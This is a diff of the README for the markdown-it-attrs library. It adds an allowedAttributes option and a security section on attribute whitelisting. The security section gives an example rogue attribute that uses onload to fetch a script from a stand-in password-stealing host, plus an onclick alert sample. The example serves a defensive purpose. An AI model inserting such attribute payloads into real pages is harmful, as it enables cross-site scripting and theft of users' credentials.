@@ -50,16 +50,6 @@ Output:
 ```
 
 
-## Security
-**NOTE!**
-
-`markdown-it-attrs` does not validate attribute input. You should validate your output HTML if security is a concern (use a whitelist).
-
-For example, a user may insert rogue attributes like this:
-```js
-![](img.png){onload=fetch(https://imstealingyourpasswords.com/script.js).then(...)}
-```
-
 ## Install
 
 ```
@@ -73,7 +63,12 @@ $ npm install --save markdown-it-attrs
 var md = require('markdown-it')();
 var markdownItAttrs = require('markdown-it-attrs');
 
-md.use(markdownItAttrs);
+md.use(markdownItAttrs, {
+  // optional, these are default options
+  leftDelimiter: '{',
+  rightDelimiter: '}',
+  allowedAttributes: []  // empty array = all attributes are allowed
+});
 
 var src = '# header {.green #id}\nsome text {with=attrs and="attrs with space"}';
 var res = md.render(src);
@@ -83,6 +78,31 @@ console.log(res);
 
 [demo as jsfiddle](https://jsfiddle.net/arve0/hwy17omn/)
 
+
+## Security
+A user may insert rogue attributes like this:
+```js
+![](img.png){onload=fetch('https://imstealingyourpasswords.com/script.js').then(...)}
+```
+
+If security is a concern, use an attribute whitelist:
+
+```js
+md.use(markdownItAttrs, {
+  allowedAttributes: ['id', 'class', /^regex.*$/]
+});
+```
+
+Now only `id`, `class` and attributes beginning with `regex` are allowed:
+
+```md
+text {#red .green regex=allowed onclick=alert('hello')}
+```
+
+Output:
+```html
+<p id="red" class="green" regex="allowed">text</p>
+```
 
 ## Ambiguity
 When class can be applied to both inline or block element, inline element will take precedence:
